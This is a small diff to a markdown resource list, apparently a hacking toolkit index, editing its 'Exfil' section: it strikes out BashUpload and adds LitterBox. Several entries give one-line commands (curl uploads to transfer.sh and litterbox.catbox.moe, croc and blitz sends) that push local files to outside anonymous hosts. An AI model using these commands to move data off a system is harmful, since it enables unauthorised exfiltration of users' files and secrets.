@@ -1385,10 +1385,11 @@ Tunneling
 Exfil
 1. [Blitz](https://github.com/hackerschoice/gsocket#blitz) - blitz -l / blitz foo.txt
 1. [Mega](https://mega.io/cmd)
-1. [BashUpload](https://bashupload.com/)
+1. ~~[BashUpload](https://bashupload.com/)~~
 2. [Transfer.sh](https://transfer.sh/) - curl --upload-file foo.txt https://transfer.sh
-3. [Croc](https://github.com/schollz/croc) - croc send foo.txt / croc anit-price-example
-4. [MagicWormhole](https://pypi.org/project/magic-wormhole/)
+3. [LitterBox](https://litterbox.catbox.moe/tools.php) - curl -F reqtype=fileupload -F time=72h -F 'fileToUpload=@foo.txt' https://litterbox.catbox.moe/resources/internals/api.php
+4. [Croc](https://github.com/schollz/croc) - croc send foo.txt / croc anit-price-example
+6. [MagicWormhole](https://pypi.org/project/magic-wormhole/)
 
 Publishing
 1. [free BT/DC/eD2k seedbox](https://valdikss.org.ru/schare/)
